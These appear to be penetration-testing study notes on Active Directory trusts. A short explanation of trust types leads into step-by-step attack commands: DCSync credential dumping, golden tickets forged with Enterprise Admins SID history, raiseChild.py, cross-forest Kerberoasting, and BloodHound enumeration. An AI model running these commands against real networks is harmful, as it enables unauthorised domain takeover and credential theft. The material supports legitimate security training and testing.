---
tags:
  - AD
---

## Overview
---
A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.

- `Parent-child`: Two or more domains within the same forest.  
The child domain has a two-way transitive trust with the parent domain,  
meaning that users in the child domain  
`corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.
- `Cross-link`: A trust between child domains to speed up authentication.
- `External`: A non-transitive trust between two separate  
domains in separate forests which are not already joined by a forest  
trust. This type of trust utilizes  
[SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) or filters out authentication requests (by SID) not from the trusted domain.
- `Tree-root`: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you  
set up a new tree root domain within a forest.  

- `Forest`: A transitive trust between two forest root domains.
- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.
Trusts can be transitive or non-transitive.
- A `transitive` trust means that trust is extended to  
objects that the child domain trusts. For example, let's say we have  
three domains. In a transitive relationship, if  
`Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
- In a `non-transitive trust`, the child domain itself is the only one trusted.

|                                                                       |                                             |
| --------------------------------------------------------------------- | ------------------------------------------- |
| Transitive                                                            | Non-Transitive                              |
| Shared, 1 to many                                                     | Direct trust                                |
| The trust is shared with anyone in the forest                         | Not extended to next level child domains    |
| Forest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups |

one-way or two-way (bidirectional).
- `One-way trust`: Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.
- `Bidirectional trust`: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in `INLANEFREIGHT.LOCAL` would be able to access resources in `FREIGHTLOGISTICS.LOCAL`, and vice-versa.
## Identify
---
**Remote**
```bash
nxc ldap <ip> -u user -p pass -M enum_trusts
```
**Local**
```Bash
Import-Module activedirectory
Get-ADTrust -Filter *
```
```Bash
netdom query /domain:inlanefreight.local trust
```
Find DC
```Bash
netdom query /domain:inlanefreight.local dc
```
Find other machines
```Bash
netdom query /domain:inlanefreight.local workstation
```
  
**Enum users in child domain**  
```Bash
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```



## **Child -> Parent Trusts from Windows**
---
## sidHistory attribute
---
If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
- If child domain has been compromised, this will allow you to move into parent domain
- if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.
### Attack Requirements
---
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.
**Obtain KRBTGT for child domain**
```Bash
mimikatz # lsadump::dcsync /user:CHILD\krbtgt
```
**Get SID for child domain**
```Bash
Get-DomainSID
```
**Get SID of Enterprise Admins group of root domain**
```Bash
Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
# or with ad module
 Get-ADGroup -Identity "Enterprise Admins" -Server "DOMAIN.LOCAL"
```
**FQDN of the child**
```Bash
Get-ADDomain
```
**Create Golden Ticket with Mimikatz**
```Bash
mimikatz # kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL /sid:<SID-OF-CHILD-DOMAIN> /krbtgt:<KRBTGTHASH> /sids:<SID-of-Enterperise-Admins-gropup-of-root-domain> /ptt
```
**Create Golden Ticket with Rubeus**
```Bash
.\Rubeus.exe golden /rc4:<KRBTGT-HASH> /domain:CHILD.DOMAIN.LOCAL /sid:<SID-OF-CHILD-DOMAIN>  /sids:<SID-of-Enterperise-Admins-gropup-of-root-domain> /user:hacker /ptt
```
**DCSync**
```Bash
mimikatz # lsadump::dcsync /user:DOMAIN\lab_adm
```
If our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller
```Bash
mimikatz # lsadump::dcsync /user:DOMAIN\lab_adm /domain:DOMAIN.LOCAL
```
## **Child -> Parent Trusts from Linux**
---
```Bash
impacket-secretsdump child.domain.local/<owned_user>@<DCIP> -just-dc-user CHILD/krbtgt
```
```Bash
lookupsid.py child.domain.local/<owned_user>@<dcip> | grep "Domain SID"
```
```Bash
lookupsid.py child.domain.local/<owned_user>@<target-dc-ip> | grep -B12 "Enterprise Admins"
```
request ticket
```Bash
impacket-ticketer -nthash <krbtgthash> -domain CHILD.DOMAIN.LOCAL -domain-sid <CHILD DOMAIN SID> -extra-sid <enterprise-admins-sid> hacker
```
```Bash
export KRB5CCNAME=hacker.ccache 
```
```Bash
impacket-psexec CHILD.DOMAIN.LOCAL/hacker@dc01.domain.local -k -no-pass -target-ip <dc-ip>
```
### Automated attack
---
```Bash
raiseChild.py -target-exec <target-dc> child.domain.local/lab_adm
```
## Cross-Forest Trust Abuse - from Windows
---
**Cross-Forest Kerberoasting**
depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold
```Bash
Get-DomainUser -SPN -Domain DOMAIN2.LOCAL | select SamAccountName
```
```Bash
Get-DomainUser -Domain DOMAIN2.LOCAL -Identity sqlsvc |select samaccountname,memberof
```
```Bash
.\Rubeus.exe kerberoast /domain:DOMAIN2.LOCAL /user:sqlsvc /nowrap
```
**Admin Password Re-Use & Group Membership**
```Bash
Get-DomainForeignGroupMember -Domain DOMAIN2.LOCAL
```
```Bash
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```
```Bash
Enter-PSSession -ComputerName DC03.DOMAIN2.LOCAL -Credential DOMAIN\administrator
```
## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux**
---
**Cross-Forest Kerberoasting**


!!! alert "note" 
	To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command


```Bash
impacket-GetUserSPNs -request -target-domain DOMAIN2.LOCAL DOMAIN.LOCAL/user
```

!!! alert "it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned"


**Hunting Foreign Group Membership with Bloodhound-python**
add to resolv.conf so we can resolv DNS entries for first domain
```Bash
cat /etc/resolv.conf 
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.
\#nameserver 1.1.1.1
\#nameserver 8.8.8.8
domain DOMAIN.LOCAL
nameserver 172.16.5.5
```
Run bloodhound
```Bash
bloodhound-python -d DOMAIN.LOCAL -dc DC01 -c All -u <user> -p <pass>
```
add resolv.conf entries for second forest
```Bash
cat /etc/resolv.conf 
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.
\#nameserver 1.1.1.1
\#nameserver 8.8.8.8
domain DOMAIN2.LOCAL
nameserver 172.16.5.238
```
Run bloodhound
```Bash
bloodhound-python -d DOMAIN2.LOCAL -dc DC02.DOMNAIN2.LOCAL -c All -u user@DOMAIN.local -p 'pass'
```
upload to bloodhound, click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `DOMAIN.LOCAL`.